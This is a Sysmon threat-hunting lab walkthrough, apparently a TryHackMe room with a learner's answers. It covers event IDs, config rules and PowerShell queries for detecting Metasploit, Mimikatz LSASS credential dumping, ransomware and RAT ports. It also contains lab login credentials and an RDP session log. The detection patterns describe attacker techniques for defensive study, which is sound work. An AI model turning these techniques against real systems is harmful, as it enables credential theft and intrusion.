---
Learn how to utilize Sysmon to monitor and log your endpoints and environments
---

![](https://assets.tryhackme.com/room-banners/sysmon.png)

###  Introduction 

Sysmon, a tool used to monitor and log events on Windows, is commonly used by enterprises as part of their monitoring and logging solutions. Part of the Windows Sysinternals package, Sysmon is similar to Windows Event Logs with further detail and granular control.

![|333](https://wp.technologyreview.com/wp-content/uploads/2020/02/ms-securitylogostackedc-grayrgb-hero-copy-small-1.png)

This room uses a modified version of the Blue and Ice boxes, as well as Sysmon logs from the Hololive network lab.

Before completing this room we recommend completing the Windows Event Log room. It is also recommended to complete the Blue and Ice rooms to get an understanding of vulnerabilities present however is not required to continue.


Complete the prerequisites listed above and jump into task 2.
*No answer needed*

### Sysmon Overview 

Sysmon Overview 

From the Microsoft Docs, "System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. By collecting the events it generates using Windows Event Collection or SIEM agents and subsequently analyzing them, you can identify malicious or anomalous activity and understand how intruders and malware operate on your network."

Sysmon gathers detailed and high-quality logs as well as event tracing that assists in identifying anomalies in your environment. Sysmon is most commonly used in conjunction with security information and event management (SIEM) system or other log parsing solutions that aggregate, filter, and visualize events. When installed on an endpoint, Sysmon will start early in the Windows boot process. In an ideal scenario, the events would be forwarded to a SIEM for further analysis. However, in this room, we will focus on Sysmon itself and view the events on the endpoint itself with Windows Event Viewer.

Events within Sysmon are stored in Applications and Services Logs/Microsoft/Windows/Sysmon/Operational


Sysmon Config Overview

Sysmon requires a config file in order to tell the binary how to analyze the events that it is receiving. You can create your own Sysmon config or you can download a config. Here is an example of a high-quality config that works well for identifying anomalies created by SwiftOnSecurity: Sysmon-Config. Sysmon includes 24 different types of Event IDs, all of which can be used within the config to specify how the events should be handled and analyzed. Below we will go over a few of the most important Event IDs and show examples of how they are used within config files.

When creating or modifying configuration files you will notice that a majority of rules in sysmon-config will exclude events rather than include events. This will help filter out normal activity in your environment that will in turn decrease the number of events and alerts you will have to manually audit or search through in a SIEM. On the other hand, there are rulesets like the ION-Storm sysmon-config fork that takes a more proactive approach with it's ruleset by using a lot of include rules. You may have to modify configuration files to find what approach you prefer. Configuration preferences will vary depending on what SOC team so prepare to be flexible when monitoring.

Note: As there are so many Event IDs Sysmon analyzes. we will only be going over a few of the ones that we think are most important to understand


Event ID 1: Process Creation

This event will look for any processes that have been created. You can use this to look for known suspicious processes or processes with typos that would be considered an anomaly. This event will use the CommandLine and Image XML tags.

```
<RuleGroup name="" groupRelation="or">
	<ProcessCreate onmatch="exclude">
	 	<CommandLine condition="is">C:\Windows\system32\svchost.exe -k appmodel -p -s camsvc</CommandLine>
	</ProcessCreate>
</RuleGroup>
```

The above code snippet is specifying the Event ID to pull from as well as what condition to look for. In this case, it is excluding the svchost.exe process from the event logs.


Event ID 3: Network Connection

The network connection event will look for events that occur remotely. This will include files and sources of suspicious binaries as well as opened ports. This event will use the Image and DestinationPort XML tags. 

```
<RuleGroup name="" groupRelation="or">
	<NetworkConnect onmatch="include">
	 	<Image condition="image">nmap.exe</Image>
	 	<DestinationPort name="Alert,Metasploit" condition="is">4444</DestinationPort>
	</NetworkConnect>
</RuleGroup>
```

The above code snippet includes two ways to identify suspicious network connection activity. The first way will identify files transmitted over open ports. In this case, we are specifically looking for nmap.exe which will then be reflected within the event logs. The second method identifies open ports and specifically port 4444 which is commonly used with Metasploit. If the condition is met an event will be created and ideally trigger an alert for the SOC to further investigate.

Event ID 7: Image Loaded

This event will look for DLLs loaded by processes, which is useful when hunting for DLL Injection and DLL Hijacking attacks. It is recommended to exercise caution when using this Event ID as it causes a high system load. This event will use the Image, Signed, ImageLoaded, and Signature XML tags. 

```
<RuleGroup name="" groupRelation="or">
	<ImageLoad onmatch="include">
	 	<ImageLoaded condition="contains">\Temp\</ImageLoaded>
	</ImageLoad>
</RuleGroup>
```

The above code snippet will look for any DLLs that have been loaded within the \Temp\ directory. If a DLL is loaded within this directory it can be considered an anomaly and should be further investigateded. 


Event ID 8: CreateRemoteThread

The CreateRemoteThread Event ID will monitor for processes injecting code into other processes. The CreateRemoteThread function is used for legitimate tasks and applications. However, it could be used by malware to hide malicious activity. This event will use the SourceImage, TargetImage, StartAddress, and StartFunction XML tags.

```
<RuleGroup name="" groupRelation="or">
	<CreateRemoteThread onmatch="include">
	 	<StartAddress name="Alert,Cobalt Strike" condition="end with">0B80</StartAddress>
	 	<SourceImage condition="contains">\</SourceImage>
	</CreateRemoteThread>
</RuleGroup>
```

The above code snippet shows two ways of monitoring for CreateRemoteThread. The first method will look at the memory address for a specific ending condition which could be an indicator of a Cobalt Strike beacon. The second method will look for injected processes that do not have a parent process. This should be considered an anomaly and require further investigation. 


Event ID 11: File Created

This event ID is will log events when files are created or overwritten the endpoint. This could be used to identify file names and signatures of files that are written to disk. This event uses TargetFilename XML tags.

```
<RuleGroup name="" groupRelation="or">
	<FileCreate onmatch="include">
	 	<TargetFilename name="Alert,Ransomware" condition="contains">HELP_TO_SAVE_FILES</TargetFilename>
	</FileCreate>
</RuleGroup> 
```

The above code snippet is an example of a ransomware event monitor. This is just one example of a variety of different ways you can utilize Event ID 11.


Event ID 12 / 13 / 14: Registry Event

This event looks for changes or modifications to the registry. Malicious activity from the registry can include persistence and credential abuse. This event uses TargetObject XML tags.

```
<RuleGroup name="" groupRelation="or">
	<RegistryEvent onmatch="include">
	 	<TargetObject name="T1484" condition="contains">Windows\System\Scripts</TargetObject>
	</RegistryEvent>
</RuleGroup>
```

The above code snippet will look for registry objects that are in the "`Windows\System\Scripts`" directory as this is a common directory for adversaries to place scripts to establish persistence.


Event ID 15: FileCreateStreamHash

This event will look for any files created in an alternate data stream. This is a common technique used by adversaries to hide malware. This event uses TargetFilename XML tags.

```
<RuleGroup name="" groupRelation="or">
	<FileCreateStreamHash onmatch="include">
	 	<TargetFilename condition="end with">.hta</TargetFilename>
	</FileCreateStreamHash>
</RuleGroup> 
```

The above code snippet will look for files with the .hta extension that have been placed within an alternate data stream.


Event ID 22: DNS Event

This event will log all DNS queries and events for analysis. The most common way to deal with these events is to exclude all trusted domains that you know will be very common "noise" in your environment. Once you get rid of the noise you can then look for DNS anomalies. This event uses QueryName XML tags. 

```
<RuleGroup name="" groupRelation="or">
	<DnsQuery onmatch="exclude">
	 	<QueryName condition="end with">.microsoft.com</QueryName>
	</DnsQuery>
</RuleGroup> 
```

The above code snippet will get exclude any DNS events with the .microsoft.com query. This will get rid of the noise that you see within the environment.  

There are a variety of ways and tags that you can use to customize your configuration files. We will be using the ION-Storm and SwiftOnSecurity config files for the rest of this room however feel free to use your own configuration files. 


Read the above and become familiar with the Sysmon Event IDs.
*No answer needed*

### Installing and Preparing Sysmon 

Installing Sysmon

The installation for Sysmon is fairly straightforward and only requires downloading the binary from the Microsoft website. You can also download all of the Sysinternals tools with a PowerShell command if you wanted to rather than grabbing a single binary. It is also recommended to use a Sysmon config file along with Sysmon to get more detailed and high-quality event tracing. As an example config file we will be using the sysmon-config file from the SwiftOnSecurity GitHub repo. 

You can find the Sysmon binary from the Microsoft Sysinternals website. You can also download the Microsoft Sysinternal Suite or use the below command to run a PowerShell module download and install all of the Sysinternals tools. 

PowerShell command: `Download-SysInternalsTools C:\Sysinternals`

To fully utilize Sysmon you will also need to download a Sysmon config or create your own config. We suggest downloading the [SwiftOnSecurity sysmon-config](https://github.com/jesusgavancho/sysmon-config). A Sysmon config will allow for further granular control over the logs as well as more detailed event tracing. In this room, we will be using both the SwiftOnSecurity configuration file as well as the ION-Storm config file. 

Starting Sysmon

To start Sysmon you will want to open a new PowerShell or Command Prompt as an Administrator. Then, run the below command it will execute the Sysmon binary, accept the end-user license agreement, and use SwiftOnSecurity config file. 

Command Used: `Sysmon.exe -accepteula -i sysmonconfig-export.xml`

```
C:\WINDOWS\system32>cd C:\Tools\Sysint

C:\Tools\Sysint>Sysmon.exe -accepteula -i sysmonconfig-export.xml


System Monitor v14.0 - System activity monitor
By Mark Russinovich and Thomas Garnier
Copyright (C) 2014-2022 Microsoft Corporation
Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
Sysinternals - www.sysinternals.com

Loading configuration file with schema version 4.50
Sysmon schema version: 4.82
Configuration file validated.
Sysmon installed.
SysmonDrv installed.
Starting SysmonDrv.
SysmonDrv started.
Starting Sysmon..
Sysmon started.

C:\Tools\Sysint>
```

Now that Sysmon is started with the configuration file we want to use, we can look at the Event Viewer to monitor events. The event log is located under Applications and Services Logs/Microsoft/Windows/Sysmon/Operational

Note: At any time you can change the configuration file used by uninstalling or updating the current configuration and replacing it with a new configuration file. For more information look through the Sysmon help menu. 

If installed correctly your event log should look similar to the following:

![](https://i.imgur.com/HtS0AOx.png)

![[Pasted image 20220904232653.png]]

For this room, we have already created an environment with Sysmon and configuration files for you. Deploy and use this machine for the remainder of this room. 

Machine IP: MACHINE_IP

User: THM-Analyst

Pass: 5TgcYzF84tcBSuL1Boa%dzcvf


Deploy the machine and start Sysmon. 
*No answer needed*

### Cutting out the Noise 

Since most of the normal activity or "noise" seen on a network is excluded or filtered out with Sysmon we're able to focus on meaningful events. This allows us to quickly identify and investigate suspicious activity. When actively monitoring a network you will want to use multiple detections and techniques simultaneously in an effort to identify threats. For this room, we will only be looking at what suspicious logs will look like with both Sysmon configs and how to optimize your hunt using only Sysmon. We will be looking at how to detect ransomware, persistence, Mimikatz, Metasploit, and Command and Control (C2) beacons.

Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS. 

Obviously, this is only showcasing a small handful of events that could be triggered in an environment. The methodology will largely be the same for other threats. It really comes down to using an ample and efficient configuration file as it can do a lot of the heavy lifting for you.

You can either download the event logs used for this task or you can open them from the Practice directory on the provided machine.


Sysmon "Best Practices"

Sysmon offers a fairly open and configurable platform for you to use. Generally speaking, there are a few best practices that you could implement to ensure you're operating efficiently and not missing any potential threats. A few common best practices are outlined and explained below.

    Exclude > Include

	When creating rules for your Sysmon configuration file it is typically best to prioritize excluding events rather than including events. This prevents you from accidentally missing crucial events and only seeing the events that matter the most.

    CLI gives you further control

	As is common with most applications the CLI gives you the most control and filtering allowing for further granular control. You can use either Get-WinEvent or wevutil.exe to access and filter logs. As you incorporate Sysmon into your SIEM or other detection solutions these tools will become less used and needed. 

    Know your environment before implementation

	Knowing your environment is important when implementing any platform or tool. You should have a firm understanding of the network or environment you are working within to fully understand what is normal and what is suspicious in order to effectively craft your rules.


Filtering Events with Event Viewer

Event Viewer might not the best for filtering events and out-of-the-box offers limited control over logs. The main filter you will be using with Event Viewer is by filtering the EventID and keywords. You can also choose to filter by writing XML but this is a tedious process that doesn't scale well.

To open the filter menu select Filter Current Log from the Actions menu. 


![](https://i.imgur.com/deaX35W.png)

If you have successfully opened the filter menu it should look like the menu below.
![](https://i.imgur.com/lJxPHBM.png)

From this menu, we can add any filters or categories that we want.


Filtering Events with PowerShell

To view and filter events with PowerShell we will be using Get-WinEvent along with XPath queries. We can use any XPath queries that can be found in the XML view of events.  Extensible Markup Language is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable We will be using wevutil.exe to view events once filtered. The command line is typically used over the Event Viewer GUI as it allows for further granular control and filtering whereas the GUI does not. For more information about using Get-WinEvent and wevutil.exe check out the Windows Event Log room.

For this room, we will only be going over a few basic filters as the Windows Event Log room already extensively covers this topic.

Filter by Event ID: `*/System/EventID=<ID>`

Filter by XML Attribute/Name: `*/EventData/Data[@Name="<XML Attribute/Name>"]`

Filter by Event Data: `*/EventData/Data=<Data>`

We can put these filters together with various attributes and data to get the most control out of our logs. Look below for an example of using Get-WinEvent to look for network connections coming from port 4444.

```
Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
```

![](https://i.imgur.com/M5hjcA6.png)


Read the above and practice filtering events.
*No answer needed*

```connect
┌──(kali㉿kali)-[~/Downloads]
└─$ xfreerdp /u:THM-Analyst /p:'5TgcYzF84tcBSuL1Boa%dzcvf' /v:10.10.91.219 /size:90%
[00:37:02:008] [174253:174254] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[00:37:02:008] [174253:174254] [WARN][com.freerdp.crypto] - CN = THM-SOC-DC01.thm.soc
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.91.219:3389) 
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] -    THM-SOC-DC01.thm.soc
[00:37:02:011] [174253:174254] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.91.219:3389 (RDP-Server):
        Common Name: THM-SOC-DC01.thm.soc
        Subject:     CN = THM-SOC-DC01.thm.soc
        Issuer:      CN = THM-SOC-DC01.thm.soc
        Thumbprint:  e8:24:21:30:e3:ec:c3:c6:f9:26:55:3b:70:d6:39:4c:8f:30:55:52:82:f2:50:c1:94:ef:5a:8e:88:74:45:7c
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[00:37:06:295] [174253:174254] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[00:37:07:019] [174253:174254] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[00:37:07:019] [174253:174254] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[00:37:07:229] [174253:174254] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[00:37:07:229] [174253:174254] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[00:37:08:171] [174253:174254] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[00:37:08:207] [174253:174254] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[00:37:08:242] [174253:174254] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[00:37:08:243] [174253:174254] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[00:37:08:277] [174253:174254] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[00:37:10:191] [174253:174254] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
[00:37:15:093] [174253:174254] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
```

```practice
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'


   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
1/5/2021 2:21:32 AM              3 Information      Network connection detected:...

```

How many event ID 3 events are in `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Filtering.evtx`? *73,591*

![[Pasted image 20220905000534.png]]


What is the UTC time created of the first network event in `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Filtering.evtx`?

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Filtering.evtx -FilterXPath '*/System/EventID=3' -Oldest -MaxEvents 1 | Format-List


TimeCreated  : 1/6/2021 1:35:52 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: RDP
               UtcTime: 2021-01-06 01:35:50.464
               ProcessGuid: {6cd1ea62-b76c-5fef-1100-00000000f500}
               ProcessId: 920
               Image: C:\Windows\System32\svchost.exe
               User: NT AUTHORITY\NETWORK SERVICE
               Protocol: tcp
               Initiated: false
               SourceIsIpv6: false
               SourceIp: 95.141.198.234
               SourceHostname: -
               SourcePort: 20032
               SourcePortName: -
               DestinationIsIpv6: false
               DestinationIp: 10.10.98.207
               DestinationHostname: THM-SOC-DC01.thm.soc
               DestinationPort: 3389
               DestinationPortName: ms-wbt-server

```

*2021-01-06 01:35:50.464*

### Hunting Metasploit 

Hunting Metasploit

Metasploit is a commonly used exploit framework for penetration testing and red team operations. Metasploit can be used to easily run exploits on a machine and connect back to a meterpreter shell. We will be hunting the meterpreter shell itself and the functionality it uses. To begin hunting we will look for network connections that originate from suspicious ports such as 4444 and 5555, by default, Metasploit uses port 4444. If there is a connection to any IP known or unknown it should be investigated. To start an investigation you can look at packet captures from the date of the log to begin looking for further information about the adversary. We can also look for suspicious processes created. This method of hunting can be applied to other various RATs and C2 beacons.

For more information about this technique and tools used check out [MITRE ATT&CK Software](https://attack.mitre.org/software/). 

For more information about how malware and payloads interact with the network check out the [Malware Common Ports Spreadsheet](https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo/edit). This will be covered in further depth in the Hunting Malware task.

You can download the event logs used in this room from this task or you can open them in the Practice folder on the provided machine.

Hunting Network Connections

We will first be looking at a modified Ion-Security configuration to detect the creation of new network connections. The code snippet below will use event ID 3 along with the destination port to identify active connections specifically connections on port 4444 and 5555. 

```
<RuleGroup name="" groupRelation="or">
	<NetworkConnect onmatch="include">
		<DestinationPort condition="is">4444</DestinationPort>
		<DestinationPort condition="is">5555</DestinationPort>
	</NetworkConnect>
</RuleGroup>
```

Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx` in Event Viewer to view a basic Metasploit payload being dropped onto the machine.

![](https://i.imgur.com/1VkrpJ3.png)

Once we identify the event it can give us some important information we can use for further investigation like the ProcessID and Image.


Hunting for Open Ports with PowerShell

To hunt for open ports with PowerShell we will be using the PowerShell module Get-WinEvent along with XPath queries. We can use the same  XPath queries that we used in the rule to filter out events from NetworkConnect with DestinationPort. The command line is typically used over the Event Viewer GUI because it can allow for further granular control and filtering that the GUI does not offer. For more information about using XPath and the command line for event viewing, check out the Windows Event Log room by Heavenraiza.

```
Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
```

![](https://i.imgur.com/M5hjcA6.png)

We can break this command down by its filters to see exactly what it is doing. It is first filtering by Event ID 3 which is the network connection ID. It is then filtering by the data name in this case DestinationPort as well as the specific port that we want to filter. We can adjust this syntax along with our events to get exactly what data we want in return.


Read the above and practice hunting Metasploit with the provided event file.
*No answer needed*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'


   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
1/5/2021 2:21:32 AM              3 Information      Network connection detected:...
```

### Detecting Mimikatz 

Detecting Mimikatz Overview

Mimikatz is well known and commonly used to dump credentials from memory along with other Windows post-exploitation activity. Mimikatz is mainly known for dumping LSASS. We can hunt for the file created, execution of the file from an elevated process, creation of a remote thread, and processes that Mimikatz creates. Anti-Virus will typically pick up Mimikatz as the signature is very well known but it is still possible for threat actors to obfuscate or use droppers to get the file onto the device. For this hunt, we will be using a custom configuration file to minimize network noise and focus on the hunt. 

For more information about this technique and the software used check out MITRE ATTACK [T1055](https://attack.mitre.org/techniques/T1055/) and [S0002](https://attack.mitre.org/software/S0002/).

You can download the event logs used in this room from this task or you can open them in the Practice folder on the provided machine.

Detecting File Creation

The first method of hunting for Mimikatz is just looking for files created with the name Mimikatz. This is a simple technique but can allow you to find anything that might have bypassed AV. Most of the time when dealing with an advanced threat you will need more advanced hunting techniques like searching for LSASS behavior but this technique can still be useful. 

This is a very simple way of detecting Mimikatz activity that has bypassed anti-virus or other detection measures. But most of the time it is preferred to use other techniques like hunting for LSASS specific behavior. Below is a snippet of a config to aid in the hunt for Mimikatz. 

```
<RuleGroup name="" groupRelation="or">
	<FileCreate onmatch="include">
		<TargetFileName condition="contains">mimikatz</TargetFileName>
	</FileCreate>
</RuleGroup>
```

As this method will not be commonly used to hunt for anomalies we will not be looking at any event logs for this specific technique.


Hunting Abnormal LSASS Behavior

We can use the ProcessAccess event ID to hunt for abnormal LSASS behavior. This event along with LSASS would show potential LSASS abuse which usually connects back to Mimikatz some other kind of credential dumping tool. Look below for more detail on hunting with these techniques.

If LSASS is accessed by a process other than svchost.exe it should be considered suspicious behavior and should be investigated further, to aid in looking for suspicious events you can use a filter to only look for processes besides svchost.exe. Sysmon will provide us further details to help lead the investigation such as the file path the process originated from. To aid in detections we will be using a custom configuration file. Below is a snippet of the config that will aid in the hunt.

```
<RuleGroup name="" groupRelation="or">
	<ProcessAccess onmatch="include">
	       <TargetImage condition="image">lsass.exe</TargetImage>
	</ProcessAccess>
</RuleGroup>
```


Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_LSASS.evtx` in Event Viewer to view an attack using an obfuscated version of Mimikatz to dump credentials from memory.

![](https://i.imgur.com/S0T3AHM.png)


We see the event that has the Mimikatz process accessed but we also see a lot of svchost.exe events? We can alter our config to exclude events with the SourceImage event coming from svhost.exe. Look below for a modified configuration rule to cut down on the noise that is present in the event logs.

```
<RuleGroup name="" groupRelation="or">
	<ProcessAccess onmatch="exclude">
		<SourceImage condition="image">svchost.exe</SourceImage>
	</ProcessAccess>
	<ProcessAccess onmatch="include">
		<TargetImage condition="image">lsass.exe</TargetImage>
	</ProcessAccess>
</RuleGroup>
 
```

By modifying the configuration file to include this exception we have cut down our events significantly and can focus on only the anomalies.  This technique can be used throughout Sysmon and events to cut down on "noise" in logs.


Detecting LSASS Behavior with PowerShell

To detect abnormal LSASS behavior with PowerShell we will again be using the PowerShell module Get-WinEvent along with XPath queries. We can use the same XPath queries used in the rule to filter out the other processes from TargetImage. If we use this alongside a well-built configuration file with a precise rule it will do a lot of the heavy lifting for us and we only need to filter a small amount.

```
Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="TargetImage"] and */EventData/Data="C:\Windows\system32\lsass.exe"'
```

![](https://i.imgur.com/IVi0BZf.png)



Read the above and practice detecting Mimikatz with the provided evtx.
*No answer needed*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Mimikatz.evtx -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="TargetImage"] and */EventData/Data="C:\Windows\system32\lsass.exe"'


   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
1/5/2021 3:22:52 AM             10 Information      Process accessed:...

```

### Hunting Malware 

Hunting Malware Overview

Malware has many forms and variations with different end goals. The two types of malware that we will be focusing on are RATs and backdoors. RATs or Remote Access Trojans are used similar to any other payload to gain remote access to a machine. RATs typically come with other Anti-Virus and detection evasion techniques that make them different than other payloads like MSFVenom. A RAT typically also uses a Client-Server model and comes with an interface for easy user administration. Examples of RATs are Xeexe and Quasar. To help detect and hunt malware we will need to first identify the malware that we want to hunt or detect and identify ways that we can modify configuration files, this is known as hypothesis-based hunting. There are of course a plethora of other ways to detect and log malware however we will only be covering the basic way of detecting open back connect ports. 

For more information about this technique and examples of malware check out [MITRE ATT&CK Software](https://attack.mitre.org/software/). 

You can download the event logs used in this room from this task or you can open them in the Practice folder on the provided machine.

Hunting Rats and C2 Servers

The first technique we will use to hunt for malware is a similar process to hunting Metasploit. We can look through and create a configuration file to hunt and detect suspicious ports open on the endpoint. By using known suspicious ports to include in our logs we can add to our hunting methodology in which we can use logs to identify adversaries on our network then use packet captures or other detection strategies to continue the investigation. The code snippet below is from the Ion-Storm configuration file which will alert when specific ports like 1034 and 1604 as well as exclude common network connections like OneDrive, by excluding events we still see everything that we want without missing anything and cutting down on noise. 

When using configuration files in a production environment you must be careful and understand exactly what is happening within the configuration file an example of this is the Ion-Storm configuration file excludes port 53 as an event. Attackers and adversaries have begun to use port 53 as part of their malware/payloads which would go undetected if you blindly used this configuration file as-is.

For more information about the ports that this configuration file alerts on check out this spreadsheet.

```
<RuleGroup name="" groupRelation="or">
	<NetworkConnect onmatch="include">
		<DestinationPort condition="is">1034</DestinationPort>
		<DestinationPort condition="is">1604</DestinationPort>
	</NetworkConnect>
	<NetworkConnect onmatch="exclude">
		<Image condition="image">OneDrive.exe</Image>
	</NetworkConnect>
</RuleGroup>


```

Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Rats.evtx` in Event Viewer to view a live rat being dropped onto the server.

![](https://i.imgur.com/h7NcexZ.png)

In the above example, we are detecting a custom rat that operates on port 8080 this is a perfect example of why you want to be careful when excluding events in order to not miss potential malicious activity.


Hunting for Common Back Connect Ports with PowerShell

Just like previous sections when using PowerShell we will again be using the PowerShell module Get-WinEvent along with XPath queries to filter our events and gain granular control over our logs. We will need to filter on the NetworkConnect event ID and the DestinationPort data attribute. If you're using a good configuration file with a reliable set of rules it will do a majority of the heavy lifting and filtering to what you want should be easy.

```
Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=<Port>'
```

![](https://i.imgur.com/neewUuV.png)


Read the Above and practice hunting rats and C2 servers with back connect ports. 
*No answer needed*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Rats.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=8080'


   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
1/5/2021 4:44:35 AM              3 Information      Network connection detected:...
1/5/2021 4:44:31 AM              3 Information      Network connection detected:...
1/5/2021 4:44:27 AM              3 Information      Network connection detected:...
1/5/2021 4:44:24 AM              3 Information      Network connection detected:...
1/5/2021 4:44:20 AM              3 Information      Network connection detected:...
1/5/2021 4:44:17 AM              3 Information      Network connection detected:...
1/5/2021 4:44:13 AM              3 Information      Network connection detected:...
1/5/2021 4:44:09 AM              3 Information      Network connection detected:...
1/5/2021 4:44:05 AM              3 Information      Network connection detected:...
1/5/2021 4:44:02 AM              3 Information      Network connection detected:...
1/5/2021 4:43:58 AM              3 Information      Network connection detected:...
1/5/2021 4:43:54 AM              3 Information      Network connection detected:...
1/5/2021 4:43:51 AM              3 Information      Network connection detected:...
1/5/2021 4:43:47 AM              3 Information      Network connection detected:...
1/5/2021 4:43:44 AM              3 Information      Network connection detected:...
1/5/2021 4:43:44 AM              3 Information      Network connection detected:...
1/5/2021 4:43:40 AM              3 Information      Network connection detected:...
1/5/2021 4:43:36 AM              3 Information      Network connection detected:...
1/5/2021 4:43:32 AM              3 Information      Network connection detected:...
1/5/2021 4:43:29 AM              3 Information      Network connection detected:...
1/5/2021 4:43:25 AM              3 Information      Network connection detected:...
1/5/2021 4:43:21 AM              3 Information      Network connection detected:...
1/5/2021 4:43:18 AM              3 Information      Network connection detected:...
1/5/2021 4:43:14 AM              3 Information      Network connection detected:...
1/5/2021 4:43:10 AM              3 Information      Network connection detected:...
1/5/2021 4:43:07 AM              3 Information      Network connection detected:...
1/5/2021 4:43:03 AM              3 Information      Network connection detected:...
1/5/2021 4:42:59 AM              3 Information      Network connection detected:...
1/5/2021 4:42:56 AM              3 Information      Network connection detected:...
1/5/2021 4:42:52 AM              3 Information      Network connection detected:...
1/5/2021 4:42:48 AM              3 Information      Network connection detected:...
1/5/2021 4:42:45 AM              3 Information      Network connection detected:...
1/5/2021 4:42:41 AM              3 Information      Network connection detected:...
1/5/2021 4:42:37 AM              3 Information      Network connection detected:...
1/5/2021 4:42:34 AM              3 Information      Network connection detected:...
1/5/2021 4:42:30 AM              3 Information      Network connection detected:...
1/5/2021 4:42:26 AM              3 Information      Network connection detected:...
1/5/2021 4:42:23 AM              3 Information      Network connection detected:...
1/5/2021 4:42:19 AM              3 Information      Network connection detected:...
1/5/2021 4:42:15 AM              3 Information      Network connection detected:...
1/5/2021 4:42:12 AM              3 Information      Network connection detected:...
1/5/2021 4:42:08 AM              3 Information      Network connection detected:...
1/5/2021 4:42:04 AM              3 Information      Network connection detected:...
1/5/2021 4:42:01 AM              3 Information      Network connection detected:...
1/5/2021 4:41:57 AM              3 Information      Network connection detected:...
1/5/2021 4:41:53 AM              3 Information      Network connection detected:...
1/5/2021 4:41:50 AM              3 Information      Network connection detected:...
1/5/2021 4:41:46 AM              3 Information      Network connection detected:...
1/5/2021 4:41:42 AM              3 Information      Network connection detected:...
1/5/2021 4:41:39 AM              3 Information      Network connection detected:...
